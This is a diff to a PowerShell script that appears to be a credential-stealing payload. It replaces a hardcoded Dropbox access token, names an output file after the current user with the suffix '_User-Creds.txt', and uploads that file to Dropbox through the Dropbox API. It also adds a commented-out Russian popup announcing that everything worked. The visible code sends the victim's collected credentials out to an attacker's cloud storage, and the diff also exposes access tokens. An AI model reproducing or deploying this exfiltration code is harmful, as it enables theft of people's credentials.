@@ -20,7 +20,7 @@
 	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
 #>
 
-$DropBoxAccessToken = "sl.BxkoYudmX3FQtAraV4BwURTjR_AK4lF-v0YkL18m5QrsK2Wn0Gar_k60Dhu8yNFLrwnaRCZqMDwgxfz87XFvBuDBul4FNz8adRzgws72MT-t9T4Lk9NcrgOO7XWton4JksdSZrwok4zzKryoft-4n4M"
+$DropBoxAccessToken = "sl.Bxnsn16K6Hl70aItFPBBbWzujBJgKQSF3koN9ecPeke2M6vPR-SQ5YG99xv5wOcixyVkvWvL1qM5ctD9V64rqs7LUWL_FdI3xQgM2QvblVSonrat-TlfReDBBQE-F18Lh8VAxNYd3kvkT4bVcpLeqp0"
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
@@ -75,4 +75,5 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 
 
-
+#$shell = New-Object -ComObject Wscript.Shell
+#$shell.popup("Ура все получилось",0,"Результат" , 64)
